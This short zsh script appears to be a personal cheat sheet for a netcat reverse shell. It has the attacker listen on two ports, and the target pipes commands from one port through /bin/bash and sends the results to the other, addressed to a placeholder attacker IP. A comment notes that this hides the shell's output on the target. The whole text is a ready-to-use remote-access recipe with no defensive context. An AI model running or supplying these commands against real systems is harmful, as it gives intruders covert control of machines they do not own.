#!/bin/zsh

# Attacker machine port 1:
nc -vlp 12345
# Attacker machine port 2:
nc -vlp 12347

# Target machine:
nc <attacker_ip> <port_1> | /bin/bash | nc <attacker_ip> <port_2>

# You will type your commands on the shell at port 1 and see the results on the shell at port 2.
# Why? Only Jesus knows. Joking, this makes the shell at target machine hide all outputs.
